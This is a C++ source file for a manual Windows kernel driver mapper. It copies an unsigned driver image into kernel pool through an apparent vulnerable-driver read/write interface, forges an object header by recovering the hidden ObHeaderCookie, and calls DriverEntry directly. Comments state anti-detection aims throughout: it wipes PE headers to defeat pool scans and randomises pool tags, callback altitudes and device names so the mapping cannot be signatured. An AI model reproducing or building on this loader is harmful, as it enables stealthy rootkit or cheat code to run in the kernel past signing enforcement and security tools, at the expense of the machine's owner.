#include "mapper.h"

#include <cstdlib>
#include <cstring>

#include "log.h"
#include "nal.h"
#include "nt.h"
#include "pe.h"

#include "km_shared_loader.h"

namespace
{
    /* DRIVER_OBJECT is 0x150 bytes on x64; round up generously. */
    constexpr uint64_t kDriverObjectSize = 0x200;

    /* Offset of DriverUnload inside DRIVER_OBJECT (x64, stable ABI). */
    constexpr uint64_t kDriverUnloadOffset = 0x68;

    /* DriverExtension pointer (0x30) and the block it must point at. */
    constexpr uint64_t kDriverExtensionOffset = 0x30;
    constexpr uint64_t kDriverExtensionSize = 0x40;

    /* OBJECT_HEADER (x64, build 26200, from the PDB): PointerCount at +0x00,
     * TypeIndex at +0x18, InfoMask at +0x1A, Body at +0x30. ObGetObjectType
     * hardcodes body-0x30, and the block is zeroed so InfoMask stays 0 and no
     * optional header information shifts the body. */
    constexpr uint64_t kObjectHeaderSize = 0x30;
    constexpr uint64_t kObjectHeaderPointerCountOffset = 0x00;
    constexpr uint64_t kObjectHeaderTypeIndexOffset = 0x18;

    /* _OBJECT_TYPE.Index - the TypeIndex stored in every object header. */
    constexpr uint64_t kObjectTypeIndexOffset = 0x28;

    bool WriteToKernel(uint64_t destination, const void* source, size_t size)
    {
        return nal::MemCopy(destination, reinterpret_cast<uint64_t>(source), size);
    }

    bool ReadFromKernel(uint64_t source, void* destination, size_t size)
    {
        return nal::ReadMemory(source, destination, size);
    }
}

namespace mapper
{
    bool Map(const std::wstring& driverPath, uint32_t clientPid, MAP_RESULT* result)
    {
        if (!result)
            return false;

        ZeroMemory(result, sizeof(*result));

        pe::IMAGE_INFO image = { 0 };
        if (!pe::Load(driverPath, &image))
            return false;

        km_log::Step("image accepted: %llu bytes, image size 0x%llX, entry RVA 0x%llX",
                  (unsigned long long)image.rawSize,
                  (unsigned long long)image.imageSize,
                  (unsigned long long)image.entryPoint);

        /* Allocate the image in kernel pool. */
        const uint64_t kernelImage = nal::AllocatePool(image.imageSize);
        if (!kernelImage)
        {
            km_log::Error("kernel allocation for the image failed");
            pe::Free(&image);
            return false;
        }

        km_log::Step("image allocated at 0x%llX", (unsigned long long)kernelImage);

        /* Local mirror so headers and relocations can be fixed up before the
         * copy into the kernel. */
        auto localImage = static_cast<uint8_t*>(calloc(1, image.imageSize));
        if (!localImage)
        {
            nal::FreePool(kernelImage);
            pe::Free(&image);
            return false;
        }

        /* Copy the headers (sized by SizeOfHeaders, already validated), then
         * every section at its virtual offset. */
        const size_t headerSize = (size_t)image.sizeOfHeaders;
        memcpy(localImage, image.raw, headerSize);

        for (uint32_t i = 0; i < image.sectionCount; ++i)
        {
            const PIMAGE_SECTION_HEADER section = &image.sections[i];
            if (!section->SizeOfRawData)
                continue;

            memcpy(localImage + section->VirtualAddress,
                   image.raw + section->PointerToRawData,
                   section->SizeOfRawData);
        }

        /* Relocate against the real load address. */
        const uint64_t delta = kernelImage - image.preferredBase;
        if (!pe::Relocate(reinterpret_cast<uint64_t>(localImage), kernelImage, delta))
        {
            km_log::Error("relocation failed");
            free(localImage);
            nal::FreePool(kernelImage);
            pe::Free(&image);
            return false;
        }

        /* Resolve imports against ntoskrnl only. */
        const auto resolve = [](const std::string& module, const std::string& function) -> uint64_t
        {
            if (_stricmp(module.c_str(), "ntoskrnl.exe") != 0)
                km_log::Warn("import from unexpected module %s", module.c_str());

            return nal::GetKernelModuleExport(nal::ntoskrnlBase, function);
        };

        if (!pe::ResolveImports(reinterpret_cast<uint64_t>(localImage), kernelImage,
                                image.importRva, resolve))
        {
            km_log::Error("import resolution failed");
            free(localImage);
            nal::FreePool(kernelImage);
            pe::Free(&image);
            return false;
        }

        /*
         * Wipe the PE headers before the image leaves user mode. They are only
         * needed for relocation and import resolution, and both have run; the
         * entry RVA is resolved to an absolute address further down, so nothing
         * consumes them again. What is left in the kernel is a big-pool chunk
         * with no MZ/NT signature at offset 0, so a pool scan cannot fingerprint
         * the mapping by its own headers. Never wipe past the first section.
         */
        {
            size_t wipeSize = headerSize;

            for (uint32_t i = 0; i < image.sectionCount; ++i)
            {
                const size_t sectionStart = (size_t)image.sections[i].VirtualAddress;

                if (sectionStart && sectionStart < wipeSize)
                    wipeSize = sectionStart;
            }

            memset(localImage, 0, wipeSize);
            km_log::Step("PE headers wiped (0x%zX bytes)", wipeSize);
        }

        /* Ship the finished image into the kernel. */
        if (!WriteToKernel(kernelImage, localImage, (size_t)image.imageSize))
        {
            km_log::Error("copying the image into the kernel failed");
            free(localImage);
            nal::FreePool(kernelImage);
            pe::Free(&image);
            return false;
        }

        free(localImage);

        /* Minimal DRIVER_OBJECT so the entry point has something to register
         * callbacks on. */
        /*
         * The object block also carries a DRIVER_EXTENSION. A NULL
         * DriverExtension is dereferenced by several kernel paths, so it has to
         * point at real storage that itself points back at the object.
         */
        /*
         * The object has to carry a real OBJECT_HEADER. IoCreateDevice takes a
         * reference on the DRIVER_OBJECT and IoDeleteDevice drops it again; a
         * bare pool block has no header, so the reference lands in DriverStart
         * and the drop underflows the count - bugcheck 0x18
         * REFERENCE_BY_POINTER with the object body as parameter 2.
         *
         * PointerCount is parked at a huge value so the object is never removed
         * by the kernel; the pool belongs to us and Unmap frees it. TypeIndex is
         * taken from the live IoDriverObjectType so any removal path that does
         * run sees a valid object type.
         */
        uint64_t driverTypeIndex = 0;
        uint8_t  objectHeaderCookie = 0;
        {
            const uint64_t driverObjectType =
                nal::GetKernelModuleExport(nal::ntoskrnlBase, "IoDriverObjectType");

            if (driverObjectType)
            {
                uint64_t typeObject = 0;

                if (ReadFromKernel(driverObjectType, &typeObject, sizeof(typeObject)) && typeObject)
                {
                    uint8_t trueIndex = 0;

                    if (ReadFromKernel(typeObject + kObjectTypeIndexOffset, &trueIndex, sizeof(trueIndex)))
                        driverTypeIndex = trueIndex;

                    /*
                     * The kernel never stores TypeIndex raw. ObGetObjectType
                     * decodes the byte as
                     *
                     *     index = stored ^ ObHeaderCookie ^ (Header >> 8)
                     *
                     * and walks ObTypeIndexTable with the result. A raw index
                     * therefore decodes to some unrelated slot - NULL on this
                     * build - and the first reference taken on the object
                     * bugchecks 0x18 with a NULL object type.
                     *
                     * ObHeaderCookie is not exported, but any live object
                     * header yields it: the OBJECT_TYPE object has a genuine
                     * header and its own index sits in plain form at
                     * _OBJECT_TYPE.Index. Invert the formula there.
                     */
                    if (driverTypeIndex)
                    {
                        const uint64_t typeObjectHeader = typeObject - kObjectHeaderSize;
                        uint8_t stored = 0;

                        if (ReadFromKernel(typeObjectHeader + kObjectHeaderTypeIndexOffset,
                                           &stored, sizeof(stored)))
                            objectHeaderCookie = (uint8_t)(stored ^ (uint8_t)driverTypeIndex ^
                                                           (uint8_t)(typeObjectHeader >> 8));
                    }
                }
            }

            /* Zero is not a valid object type index - it is what the header held
             * when the object underflowed. Say so instead of leaving it silent. */
            if (!driverTypeIndex)
                km_log::Warn("could not resolve the driver object type index");
            if (!objectHeaderCookie)
                km_log::Warn("could not recover the object header cookie");
        }

        const uint64_t driverObjectBlock =
            nal::AllocatePool(kObjectHeaderSize + kDriverObjectSize + kDriverExtensionSize);
        if (!driverObjectBlock)
        {
            km_log::Error("driver object allocation failed");
            nal::FreePool(kernelImage);
            pe::Free(&image);
            return false;
        }

        /* DriverEntry receives the body, not the allocation. */
        const uint64_t driverObject = driverObjectBlock + kObjectHeaderSize;

        uint8_t zeroed[kObjectHeaderSize + kDriverObjectSize + kDriverExtensionSize] = { 0 };
        WriteToKernel(driverObjectBlock, zeroed, sizeof(zeroed));

        {
            const int64_t pinnedCount = 0x40000000;

            /* Store the index the way the kernel expects to read it back. */
            const uint8_t storedTypeIndex =
                (uint8_t)((uint8_t)driverTypeIndex ^ objectHeaderCookie ^
                          (uint8_t)(driverObjectBlock >> 8));

            WriteToKernel(driverObjectBlock + kObjectHeaderPointerCountOffset,
                          &pinnedCount, sizeof(pinnedCount));
            WriteToKernel(driverObjectBlock + kObjectHeaderTypeIndexOffset,
                          &storedTypeIndex, sizeof(storedTypeIndex));

            /*
             * Decode it again exactly as ObGetObjectType does. If the cookie was
             * recovered wrong this is where it shows up as a mismatch, while a
             * status is still possible, instead of as bugcheck 0x18 on the first
             * reference the kernel takes.
             */
            uint8_t verifyStored = 0;

            if (!ReadFromKernel(driverObjectBlock + kObjectHeaderTypeIndexOffset,
                                &verifyStored, sizeof(verifyStored)))
                km_log::Warn("could not read back the object header type index");
            else
            {
                const uint8_t decoded = (uint8_t)(verifyStored ^ objectHeaderCookie ^
                                                  (uint8_t)(driverObjectBlock >> 8));

                if (decoded != (uint8_t)driverTypeIndex)
                    km_log::Error("object header type index decodes to %u, expected %u",
                                   (unsigned)decoded, (unsigned)(uint8_t)driverTypeIndex);
                else
                    km_log::Step("object header type index encoded (index %u, cookie 0x%02X)",
                              (unsigned)decoded, (unsigned)objectHeaderCookie);
            }
        }

        const uint64_t extension = driverObject + kDriverObjectSize;
        const uint64_t extensionObject = driverObject;

        WriteToKernel(driverObject + kDriverExtensionOffset, &extension, sizeof(extension));
        WriteToKernel(extension, &extensionObject, sizeof(extensionObject));

        /* Init block: magic + client pid, handed over as DriverEntry arg 2. */
        const uint64_t initBlock = nal::AllocatePool(sizeof(KM_INIT_PARAMS));
        if (!initBlock)
        {
            km_log::Error("init block allocation failed");
            nal::FreePool(driverObject - kObjectHeaderSize);
            nal::FreePool(kernelImage);
            pe::Free(&image);
            return false;
        }

        KM_INIT_PARAMS params = { 0 };
        params.Magic = KM_INIT_MAGIC;
        params.ClientPid = clientPid;
        params.ImageBase = kernelImage;
        params.ImageSize = image.imageSize;
        /* Per-install callback altitude seed, so the filter is not pinned to one
         * fixed number that can be signatured or already occupied. */
        params.AltitudeSeed = (unsigned long)GetTickCount() ^ (unsigned long)GetCurrentThreadId();
        /* Per-install pool tag: four letters derived from the same seed, so the
         * tag is not a build constant that greps straight back to this project. */
        {
            unsigned long tagSeed = (unsigned long)GetTickCount() * 2654435761u ^
                                    (unsigned long)GetCurrentThreadId();

            for (int i = 0; i < 4; ++i)
            {
                params.PoolTag |= (unsigned long)('a' + (tagSeed & 0x0F)) << (i * 8);
                tagSeed >>= 4;
            }
        }
        /* Per-install device name, so the namespace is not a build constant. */
        if (const std::wstring& device = nal::DeviceName(); !device.empty())
            wcsncpy_s(params.DeviceName, device.c_str(), _TRUNCATE);
        WriteToKernel(initBlock, &params, sizeof(params));

        const uint64_t entryPoint = kernelImage + image.entryPoint;
        km_log::Step("calling DriverEntry at 0x%llX (client pid %u, object 0x%llX)",
                  (unsigned long long)entryPoint, clientPid,
                  (unsigned long long)driverObject);

        uint64_t entryStatus = 0;
        const uint64_t args[4] = { driverObject, initBlock, 0, 0 };

        if (!nal::CallKernelFunctionRaw(&entryStatus, entryPoint, args, 2))
        {
            km_log::Error("the kernel call for DriverEntry failed");
            nal::FreePool(initBlock);
            nal::FreePool(driverObject - kObjectHeaderSize);
            nal::FreePool(kernelImage);
            pe::Free(&image);
            return false;
        }

        nal::FreePool(initBlock);

        result->imageBase = kernelImage;
        result->imageSize = image.imageSize;
        result->driverObject = driverObject;
        result->entryPoint = entryPoint;
        result->status = static_cast<NTSTATUS>(entryStatus);

        pe::Free(&image);

        if (!NT_SUCCESS(result->status))
        {
            km_log::Error("DriverEntry returned 0x%08X", (unsigned)result->status);
            nal::FreePool(driverObject - kObjectHeaderSize);
            nal::FreePool(kernelImage);
            return false;
        }

        return true;
    }

    bool Unmap(const MAP_RESULT& result)
    {
        if (!result.imageBase)
            return false;

        /*
         * DriverUnload MUST run before the image is freed, otherwise the device
         * object is left dangling inside freed pool and any later open dispatches
         * into garbage. It was previously skipped silently whenever the kernel read
         * failed - which is exactly what happens in a fresh process that never
         * opened the host - so the free is now conditional on having read it.
         */
        if (result.driverObject)
        {
            uint64_t unload = 0;

            if (!ReadFromKernel(result.driverObject + kDriverUnloadOffset, &unload, sizeof(unload)))
            {
                km_log::Error("cannot read DriverUnload - image NOT freed, retry unload");
                return false;
            }

            if (unload)
            {
                km_log::Step("calling DriverUnload at 0x%llX", (unsigned long long)unload);
                const uint64_t args[4] = { result.driverObject, 0, 0, 0 };

                if (!nal::CallKernelFunctionRaw(nullptr, unload, args, 1))
                {
                    km_log::Error("DriverUnload call failed - image NOT freed");
                    return false;
                }

                km_log::Step("DriverUnload returned, draining IRPs");
            }

            nal::FreePool(result.driverObject - kObjectHeaderSize);
        }

        /*
         * DriverUnload deleted the device, but an IRP already past the device
         * lookup can still be executing inside this image. Freeing the pool the
         * instant DriverUnload returns leaves it dispatching into freed memory,
         * which is a bugcheck on a machine that was only closing a handle.
         * The driver also sets its own unloading flag; this drain covers the
         * window before that flag is observable.
         */
        Sleep(250);

        nal::FreePool(result.imageBase);
        return true;
    }
}
